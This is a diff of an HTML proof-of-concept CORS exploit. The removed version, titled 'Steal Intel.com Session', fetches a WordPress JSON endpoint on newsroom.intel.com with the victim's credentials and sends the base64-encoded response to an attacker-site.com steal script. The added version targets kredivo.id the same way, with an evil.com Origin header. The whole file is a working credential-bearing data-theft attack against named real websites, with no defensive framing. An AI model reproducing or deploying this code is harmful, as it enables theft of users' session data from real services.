@@ -1,31 +1,20 @@
+<!-- file: cors-poc.html -->
 <!DOCTYPE html>
 <html>
-<head>
-  <title>CORS Exploit PoC – Steal Intel.com Session</title>
-</head>
-<body>
-  <h1>CORS Exploit PoC – Steal Intel.com Session</h1>
-  <button onclick="exploit()">Click to Exploit</button>
-
-  <script>
-    function exploit() {
-      fetch("https://newsroom.intel.com/wp-json/", {
+  <body>
+    <h1>CORS POC</h1>
+    <script>
+      fetch("https://kredivo.id/wp-json/", {
         method: "GET",
-        credentials: "include"
+        credentials: "include",
+        headers: {
+          Origin: "https://evil.com"
+        }
       })
       .then(response => response.text())
-      .then(data => {
-        // طباعة البيانات في console (أو إرسالها لموقعك)
-        console.log("Intel.com response:", data);
-
-        // إرسالها لسيرفر المهاجم (اختياري لو حبيت)
-        fetch("https://attacker-site.com/steal.php?data=" + btoa(data));
-      })
-      .catch(error => {
-        console.error("Exploit failed", error);
-      });
-    }
-  </script>
-</body>
+      .then(data => console.log("Response:", data));
+    </script>
+  </body>
 </html>
+
 
